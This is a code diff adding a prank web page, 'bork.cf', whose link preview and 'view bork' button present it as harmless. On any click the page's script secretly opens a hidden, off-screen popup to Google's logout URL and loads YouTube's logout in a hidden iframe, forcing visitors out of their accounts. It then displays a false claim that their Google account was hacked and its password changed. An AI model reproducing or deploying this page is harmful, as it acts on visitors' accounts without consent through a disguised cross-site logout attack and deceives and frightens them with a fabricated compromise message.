@@ -1,0 +1,68 @@
+<style>
+
+    * {
+        font-family: monospace;
+        color: white;
+    }
+
+    body {
+        margin: 0;
+        padding: 0;
+        width: 100%;
+        height: 100%;
+        background: #333;
+    }
+</style>
+<meta property="og:title" content="bork.cf" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://OutlawsHub-c00dy.cc/purchase" />
+<meta property="og:image" content="https://cdn.discordapp.com/avatars/723488759957553152/a_0089214cfe4d266b7540757a65206799.gif?size=4096" />
+<meta property="og:description" content="bork bork bork bork" />
+<meta name="theme-color" content="#FFBFF8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>bork</title>
+
+<body onmousedown="logout()">
+    <div style="position:absolute;top:50%;left:0;width:100%;transform:translateY(-50%);text-align: center">
+        <div id="continue">
+            <h1>welcome to bork.cf</h1>
+            <button id="btn" style="padding:10px;color:black;">view bork</button>
+        </div>
+        <div id="hidden" style="display:none;">
+            <h1>✔️<br>Hacked Google Account successfully and changed password!</h1>
+            <p></b></p>
+        </div>
+    </div>
+    <iframe id="iframe" style="display: none"></iframe>
+</body>
+<script>
+    const logout = () => {
+        if (document.getElementById('continue').style.display === 'none') return;
+        document.getElementById('continue').style.display = 'none';
+        document.getElementById('hidden').style.display = 'block';
+
+        setTimeout(() => {
+            document.getElementById('iframe').src = 'https://www.youtube.com/logout'
+        }, 2000)
+
+        const left = screen.width;
+        const top = screen.height;
+        const blah = window.open(
+            'https://accounts.google.com/Logout',
+            'blah,,',
+            'scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=1,height=1,left=' + left + ',top=' + top
+        );
+
+        window.focus();
+
+        setTimeout(() => {
+            blah.close();
+        }, 2500)
+    }
+
+    document.getElementById('btn').addEventListener('click', () => {
+        logout();
+    })
+
+    // setTimeout(() => {window.location = 'https://accounts.google.com/Logout'}, 5000)
+</script>
